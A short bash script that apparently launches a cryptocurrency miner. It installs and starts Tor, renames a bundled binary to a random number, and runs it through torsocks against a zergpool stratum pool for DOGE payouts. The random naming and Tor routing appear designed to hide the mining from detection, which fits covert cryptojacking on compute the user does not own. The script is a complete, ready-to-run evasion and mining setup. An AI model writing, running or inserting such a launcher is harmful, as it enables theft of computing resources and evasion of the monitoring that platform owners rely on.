user=$1 
proxy=$2 
worker=$(shuf -n 1 -i 1-9999999) 
apt update -y 
apt install -y tor 
service tor start && sleep 30 
mv cpm1 $worker 
chmod +x $worker 
torsocks ./$worker -a power2b -o stratum+tcp://power2b.mine.zergpool.com:7445 -u $user.$worker -p c=DOGE,mc=MBC -x $proxy
